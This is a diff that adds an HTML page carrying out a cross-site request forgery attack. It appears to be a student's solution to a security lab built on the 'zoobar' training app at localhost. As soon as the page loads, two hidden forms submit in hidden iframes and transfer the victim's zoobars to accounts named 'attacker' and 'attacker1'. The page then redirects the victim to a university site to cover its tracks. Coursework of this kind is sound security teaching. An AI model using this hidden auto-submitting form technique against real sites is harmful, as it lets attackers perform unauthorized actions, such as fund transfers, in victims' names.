@@ -1,0 +1,26 @@
+<html>
+    <body>
+        <form name="at1" action="http://localhost:8080/zoobar/index.cgi/transfer" method="POST" target="target1">
+            <input type="hidden" name="zoobars" value="1" />
+            <input type="hidden" name="recipient" value="attacker" />
+        </form>
+            <form name="at2" action="http://localhost:8080/zoobar/index.cgi/transfer" method="POST" target="target2">
+            <input type="hidden" name="zoobars" value="9" />
+            <input type="hidden" name="recipient" value="attacker1" />
+        </form>
+        <iframe style="display:none" id="target1" name="target1" frameborder="0"></iframe>
+        <iframe style="display:none" id="target2" name="target2" frameborder="0"></iframe>
+        <script> 
+            document.getElementById("target1").onload = function() {
+                // Nothing needs to be done :P 
+            }
+
+            document.getElementById("target2").onload = function() {
+                window.location.href = "http://moodle.cse.iitk.ac.in";
+            }
+            document.forms[0].submit();
+            document.forms[1].submit();
+
+        </script>
+    </body>
+</html>
